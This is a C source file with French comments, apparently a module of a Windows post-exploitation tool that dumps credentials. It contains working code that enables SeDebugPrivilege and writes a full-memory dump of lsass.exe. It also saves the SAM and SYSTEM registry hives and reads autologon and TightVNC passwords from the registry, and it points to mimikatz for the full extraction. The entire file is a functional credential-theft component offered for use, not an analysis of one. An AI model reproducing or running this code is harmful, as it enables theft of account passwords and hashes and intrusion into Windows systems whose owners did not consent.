/*
 * lsass.c - Credential Dumping
 *
 * LSASS dump via MiniDumpWriteDump
 * SAM/SYSTEM extraction via Registry
 * Registry credentials (autologon, VNC, PuTTY)
 *
 * NOTE: Nécessite des privilèges élevés (SeDebugPrivilege)
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <dbghelp.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "dbghelp.lib")

/* ============================================================================
 * Utilitaires
 * ============================================================================ */

/* Active le privilège SeDebugPrivilege */
static BOOL EnableDebugPrivilege(void) {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return FALSE;
    }

    if (!LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL result = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);

    return result && GetLastError() == ERROR_SUCCESS;
}

/* Trouve le PID de lsass.exe */
static DWORD FindLsassPID(void) {
    DWORD pid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, "lsass.exe") == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return pid;
}

/* ============================================================================
 * LSASS Dump
 * ============================================================================ */

/*
 * Dump la mémoire de lsass.exe dans un buffer.
 * Utilise MiniDumpWriteDump avec un fichier temporaire.
 * L'appelant doit libérer outData.
 */
BOOL Lsass_Dump(BYTE** outData, DWORD* outSize) {
    if (!outData || !outSize) return FALSE;
    *outData = NULL;
    *outSize = 0;

    // Active SeDebugPrivilege
    if (!EnableDebugPrivilege()) {
        return FALSE;
    }

    // Trouve lsass.exe
    DWORD lsassPid = FindLsassPID();
    if (lsassPid == 0) {
        return FALSE;
    }

    // Ouvre le processus
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, lsassPid);
    if (!hProcess) {
        return FALSE;
    }

    // Crée un fichier temporaire pour le dump
    char tempPath[MAX_PATH];
    char dumpPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    snprintf(dumpPath, MAX_PATH, "%s\\lsass_%lu.dmp", tempPath, GetTickCount());

    HANDLE hFile = CreateFileA(dumpPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        CloseHandle(hProcess);
        return FALSE;
    }

    // Effectue le dump
    BOOL dumpResult = MiniDumpWriteDump(
        hProcess,
        lsassPid,
        hFile,
        MiniDumpWithFullMemory,
        NULL,
        NULL,
        NULL
    );

    CloseHandle(hFile);
    CloseHandle(hProcess);

    if (!dumpResult) {
        DeleteFileA(dumpPath);
        return FALSE;
    }

    // Lit le fichier dump
    hFile = CreateFileA(dumpPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        DeleteFileA(dumpPath);
        return FALSE;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
        CloseHandle(hFile);
        DeleteFileA(dumpPath);
        return FALSE;
    }

    *outData = (BYTE*)malloc(fileSize);
    if (!*outData) {
        CloseHandle(hFile);
        DeleteFileA(dumpPath);
        return FALSE;
    }

    DWORD bytesRead;
    if (!ReadFile(hFile, *outData, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        free(*outData);
        *outData = NULL;
        CloseHandle(hFile);
        DeleteFileA(dumpPath);
        return FALSE;
    }

    *outSize = fileSize;
    CloseHandle(hFile);
    
    // Supprime le fichier temporaire
    DeleteFileA(dumpPath);

    return TRUE;
}

/* ============================================================================
 * SAM/SYSTEM Extraction
 * ============================================================================ */

/*
 * Sauvegarde une ruche de registre dans un fichier temporaire puis lit son contenu.
 */
static BOOL SaveRegistryHive(const char* hivePath, BYTE** outData, DWORD* outSize) {
    if (!outData || !outSize) return FALSE;
    *outData = NULL;
    *outSize = 0;

    char tempPath[MAX_PATH];
    char savePath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    snprintf(savePath, MAX_PATH, "%s\\hive_%lu.bin", tempPath, GetTickCount());

    // Ouvre la clé de registre
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, hivePath, 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        return FALSE;
    }

    // Sauvegarde la ruche (nécessite des privilèges élevés)
    LONG result = RegSaveKeyA(hKey, savePath, NULL);
    RegCloseKey(hKey);

    if (result != ERROR_SUCCESS) {
        return FALSE;
    }

    // Lit le fichier
    HANDLE hFile = CreateFileA(savePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        DeleteFileA(savePath);
        return FALSE;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
        CloseHandle(hFile);
        DeleteFileA(savePath);
        return FALSE;
    }

    *outData = (BYTE*)malloc(fileSize);
    if (!*outData) {
        CloseHandle(hFile);
        DeleteFileA(savePath);
        return FALSE;
    }

    DWORD bytesRead;
    if (!ReadFile(hFile, *outData, fileSize, &bytesRead, NULL)) {
        free(*outData);
        *outData = NULL;
        CloseHandle(hFile);
        DeleteFileA(savePath);
        return FALSE;
    }

    *outSize = bytesRead;
    CloseHandle(hFile);
    DeleteFileA(savePath);

    return TRUE;
}

/*
 * Extrait la ruche SAM.
 */
BOOL Registry_DumpSAM(BYTE** outData, DWORD* outSize) {
    EnableDebugPrivilege(); // Pour backup privilege
    return SaveRegistryHive("SAM", outData, outSize);
}

/*
 * Extrait la ruche SYSTEM.
 */
BOOL Registry_DumpSYSTEM(BYTE** outData, DWORD* outSize) {
    EnableDebugPrivilege();
    return SaveRegistryHive("SYSTEM", outData, outSize);
}

/* ============================================================================
 * Registry Credentials
 * ============================================================================ */

/*
 * Extrait les credentials stockés dans le registre.
 * Retourne un JSON avec les infos trouvées.
 */
BOOL Registry_GetStoredCredentials(char** outJson) {
    if (!outJson) return FALSE;

    char* json = (char*)malloc(4096);
    if (!json) return FALSE;

    char autologonUser[256] = {0};
    char autologonPass[256] = {0};
    char vncPassword[256] = {0};
    DWORD size;

    // Windows Autologon
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
                      "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
                      0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        size = sizeof(autologonUser);
        RegQueryValueExA(hKey, "DefaultUserName", NULL, NULL, (LPBYTE)autologonUser, &size);
        
        size = sizeof(autologonPass);
        RegQueryValueExA(hKey, "DefaultPassword", NULL, NULL, (LPBYTE)autologonPass, &size);
        
        RegCloseKey(hKey);
    }

    // VNC Password (TightVNC)
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                      "SOFTWARE\\TightVNC\\Server",
                      0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        BYTE vncBytes[16] = {0};
        size = sizeof(vncBytes);
        if (RegQueryValueExA(hKey, "Password", NULL, NULL, vncBytes, &size) == ERROR_SUCCESS) {
            // VNC password is DES encrypted, just report it exists
            strcpy(vncPassword, "[VNC password found - DES encrypted]");
        }
        RegCloseKey(hKey);
    }

    // Construit le JSON
    snprintf(json, 4096,
        "{\n"
        "  \"autologon\": {\n"
        "    \"username\": \"%s\",\n"
        "    \"password\": \"%s\"\n"
        "  },\n"
        "  \"vnc\": \"%s\",\n"
        "  \"note\": \"Use mimikatz/pypykatz for complete extraction\"\n"
        "}",
        autologonUser,
        autologonPass[0] ? "[REDACTED - password found]" : "",
        vncPassword);

    *outJson = json;
    return TRUE;
}
